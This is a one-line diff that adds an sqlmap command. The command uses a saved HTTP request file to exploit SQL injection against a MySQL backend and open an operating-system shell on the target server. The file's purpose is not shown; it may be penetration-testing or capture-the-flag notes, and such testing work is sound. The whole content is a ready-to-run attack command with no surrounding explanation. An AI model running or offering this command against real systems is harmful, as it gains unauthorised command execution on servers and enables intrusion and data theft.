@@ -1,0 +1,1 @@
+sqlmap -r new.req --dbms mysql --os-shell 
